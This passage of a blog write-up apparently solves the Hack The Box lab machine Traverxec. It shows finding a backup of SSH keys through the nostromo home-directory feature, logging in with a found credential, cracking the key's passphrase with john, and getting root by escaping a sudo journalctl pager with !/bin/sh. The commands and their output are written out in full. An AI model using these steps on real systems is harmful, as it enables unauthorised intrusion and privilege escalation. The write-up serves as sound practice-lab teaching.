<td class="rouge-code"><pre># MAIN [MANDATORY]                                                                                
                                                                                                  
servername              traverxec.htb                                                             
serverlisten            *                                                                         
serveradmin             david@traverxec.htb                                                       
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
</pre></td>
</tr></tbody></table></code></div></div>
<p>If we look at the documentation for the <code class="language-plaintext highlighter-rouge">nostromo</code> service,</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre>HOMEDIRS

To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:
http://www.nazgul.ch/~hacki/
...
</pre></td>
</tr></tbody></table></code></div></div>
<p>Hmm… If we append <code class="language-plaintext highlighter-rouge">~</code> in front of <code class="language-plaintext highlighter-rouge">david</code> to the URL, we get <code class="language-plaintext highlighter-rouge">http://traverxec.htb/~david</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traverxec2.png" alt=""></p>
<p>Nothing much here but we are getting somewhere. If we read more of the documentation,</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre>HOMEDIRS
...
You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option
</pre></td>
</tr></tbody></table></code></div></div>
<p>This means that the directory <code class="language-plaintext highlighter-rouge">public_www</code> must exist in the home directory of the users for this feature to work. Lets try browsing to <code class="language-plaintext highlighter-rouge">/home/david/public_www</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www<span class="nv">$ </span><span class="nb">ls
ls
</span>index.html  protected-file-area
</pre></td>
</tr></tbody></table></code></div></div>
<p>What do we have here ? Inside the <code class="language-plaintext highlighter-rouge">protected-file-area</code>, we find a backup of <code class="language-plaintext highlighter-rouge">ssh</code> files.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www<span class="nv">$ </span><span class="nb">ls </span>protected-file-area
backup-ssh-identity-files.tgz
</pre></td>
</tr></tbody></table></code></div></div>
<p>Couldn’t find any <code class="language-plaintext highlighter-rouge">curl</code> or <code class="language-plaintext highlighter-rouge">ftp</code> on the machine to upload the files to us, so lets see if we can access the folder via the browser at <code class="language-plaintext highlighter-rouge">http://traverxec.htb/~david/protected-file-area</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traverxec3.png" alt=""></p>
<p>We get prompted for authentication, keyed in <code class="language-plaintext highlighter-rouge">david:Nowonly4me</code> and we can now proceed to download the file.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traverxec4.png" alt=""></p>
<p>To extract the contents, we run <code class="language-plaintext highlighter-rouge">tar</code> on it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
</pre></td>
</tr></tbody></table></code></div></div>
<p>Lets see if we can <code class="language-plaintext highlighter-rouge">ssh</code> using the private <code class="language-plaintext highlighter-rouge">ssh</code> key.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa david@traverxec.htb
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
</pre></td>
</tr></tbody></table></code></div></div>
<p>Seems like we need a passphrase. Lets see if we can crack it with <code class="language-plaintext highlighter-rouge">john</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>python ssh2john.py id_rsa <span class="o">&gt;</span> david.hash
<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt david.hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
finding a possible candidate.
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
Warning: Only 2 candidates left, minimum 8 needed <span class="k">for </span>performance.
1g 0:00:00:02 DONE <span class="o">(</span>2019-12-21 22:53<span class="o">)</span> 0.4132g/s 5926Kp/s 5926Kc/s 5926KC/sa6_123..<span class="k">*</span>7¡Vamos!
Session completed

</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="usertxt">user.txt</h1>
<p>With the passphrase, lets try <code class="language-plaintext highlighter-rouge">ssh</code>ing as <code class="language-plaintext highlighter-rouge">david</code> and retrieve the user flag.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa david@traverxec.htb
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux traverxec 4.19.0-6-amd64 <span class="c">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
Last login: Wed Jan  1 02:54:14 2020 from 10.10.XX.XX
david@traverxec:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
7db0XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumeration-3">Enumeration (3)</h1>
<p>In <code class="language-plaintext highlighter-rouge">david</code>’s home directory , we see an interesting directory called <code class="language-plaintext highlighter-rouge">bin</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td>
<td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span><span class="nb">ls
</span>bin  public_www  user.txt
david@traverxec:~<span class="nv">$ </span><span class="nb">ls </span>bin
server-stats.head  server-stats.sh
</pre></td>
</tr></tbody></table></code></div></div>
<p>server-stats.head contained an <code class="language-plaintext highlighter-rouge">ASCII</code> banner while server-stats.sh contained some commands.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td>
<td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span><span class="nb">cat </span>bin/server-stats.sh
<span class="c">#!/bin/bash</span>

<span class="nb">cat</span> /home/david/bin/server-stats.head
<span class="nb">echo</span> <span class="s2">"Load: </span><span class="sb">`</span>/usr/bin/uptime<span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Open nhttpd sockets: </span><span class="sb">`</span>/usr/bin/ss <span class="nt">-H</span> sport <span class="o">=</span> 80 | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"Files in the docroot: </span><span class="sb">`</span>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">" "</span>
<span class="nb">echo</span> <span class="s2">"Last 5 journal log lines:"</span>
/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
</pre></td>
</tr></tbody></table></code></div></div>
<p>On the last line, we see a <code class="language-plaintext highlighter-rouge">sudo</code> command being ran.</p>
<p>Running the <code class="language-plaintext highlighter-rouge">sudo</code> command with the <code class="language-plaintext highlighter-rouge">journalctl</code> command simply prints some logs to the screen.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td>
<td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
<span class="nt">--</span> Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:38:03 EST. <span class="nt">--</span>
Jan 01 02:50:20 traverxec nhttpd[458]: configuration has been reloaded
Jan 01 03:11:32 traverxec nhttpd[810]: stopped
Jan 01 03:13:22 traverxec nhttpd[458]: configuration has been reloaded
Jan 01 03:20:37 traverxec crontab[1414]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
Jan 01 03:22:18 traverxec <span class="nb">sudo</span><span class="o">[</span>1420]: www-data : unknown user: <span class="c">#-1</span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>According to <code class="language-plaintext highlighter-rouge">journalctl</code>’s entry in <a href="https://gtfobins.github.io/gtfobins/journalctl/"><code class="language-plaintext highlighter-rouge">GTFOBins</code></a>, we see that we are able to break out by spawning a shell by entering <code class="language-plaintext highlighter-rouge">!/bin/sh</code>. But where can we enter the command ?</p>
<p>According to the <code class="language-plaintext highlighter-rouge">man</code> page of <code class="language-plaintext highlighter-rouge">journalctl</code>, the output is piped to <code class="language-plaintext highlighter-rouge">less</code>!</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre>...
The output is paged through less by default, and long lines are "truncated" to screen
width. The hidden part can be viewed by using the left-arrow and right-arrow keys.
Paging can be disabled; see the --no-pager option and the "Environment" section below.
...
</pre></td>
</tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">less</code> will only work as intended if the output is more than the capacity of the terminal screen, hence if we shrink the width of it and run the command again,</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td>
<td class="rouge-code"><pre>- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:45:55 EST. --
Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1
Jan 01 03:44:32 traverxec su[1670]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost=  user=davi
Jan 01 03:44:34 traverxec su[1670]: FAILED SU (to david) www-data on pts/9
Jan 01 03:45:04 traverxec su[1674]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost=  user=davi
Jan 01 03:45:05 traverxec su[1674]: FAILED SU (to david) www-data on pts/9
lines 1-6/6 (END)
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="roottxt">root.txt</h1>
<p>We get a somewhat incomplete output and by entering <code class="language-plaintext highlighter-rouge">!/bin/sh</code>, we get a shell as <code class="language-plaintext highlighter-rouge">root</code>!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre><span class="o">!</span>/bin/sh
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
9aa3XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></td>
</tr></tbody></table></code></div></div>
<h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3>
</div>
<div class="post-tail-wrapper text-muted">
<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/hackthebox/">hackthebox</a>
</div>
<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/redis/" class="post-tag no-text-decoration">redis</a> <a href="/tags/ssh/" class="post-tag no-text-decoration">ssh</a> <a href="/tags/webmin/" class="post-tag no-text-decoration">webmin</a> <a href="/tags/linux/" class="post-tag no-text-decoration">linux</a>
</div>
<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div>
<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Traverxec%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/traverxec-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Traverxec%20-%20rizemon's%20blog&amp;u=https://rizemon.github.io/posts/traverxec-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack%20The%20Box%20-%20Traverxec%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/traverxec-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span>
</div>
</div>
</div>
</div></div>
<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
<div class="access">
<div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2">
<li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a></li>
<li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a></li>
<li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a></li>
<li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a></li>
<li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></li>
</ul>
</div>
<div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
</div>
</div>
<div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav>
</div>
</div>
</div>
<div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<div id="related-posts" class="mt-5 mb-2 mb-sm-4">
<h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
<div class="card-deck mb-4">
<div class="card"> <a href="/posts/postman-htb/"><div class="card-body"> <span class="timeago small"> Mar 15, 2020 <i class="unloaded">2020-03-15T11:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Postman</h3>
<div class="text-muted small"><p> Despite the name of this box, it was nowhere related to Postman! This box was quite weird as I actually jumped straight to root instead of going to user first. Configuration The operating syste...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small"> Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3>
<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/haystack-htb/"><div class="card-body"> <span class="timeago small"> Nov 3, 2019 <i class="unloaded">2019-11-03T18:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Haystack</h3>
<div class="text-muted small"><p> I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The opera...</p></div>
</div></a>
</div>
</div>
</div>
<div class="post-navigation d-flex justify-content-between"> <a href="/posts/sniper-htb/" class="btn btn-outline-primary"><p>Hack The Box - Sniper</p></a> <a href="/posts/mango-htb/" class="btn btn-outline-primary"><p>Hack The Box - Mango</p></a>
</div>
</div></div></div>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center">
<div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
<div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
</div></footer>
</div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content">
<div id="search-hints">
<h4 class="text-muted mb-4">Trending Tags</h4>
<a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
</div></div>
</div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
